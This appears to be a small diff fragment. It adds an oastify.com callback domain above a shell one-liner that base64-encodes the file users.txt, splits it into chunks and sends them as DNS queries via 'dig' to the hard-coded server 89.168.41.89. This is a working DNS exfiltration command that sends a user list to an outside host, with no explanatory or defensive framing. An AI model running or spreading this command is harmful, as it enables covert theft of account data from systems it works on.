@@ -1,3 +1,8 @@
+g7o74xngla94bcoshari779xkoqfe52u.oastify.com
+
+
+
+
 f=users.txt; s=4;b=57;c=0; for r in $(for i in $(base64 -w0 $f| sed "s/.\{$b\}/&\n/g");do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-."; c=$(($c+1)); else echo -ne "\n$i-."; c=1; fi; done ); do dig @89.168.41.89 `echo -ne $r$f|tr "+" "*"` +short; done
 
 
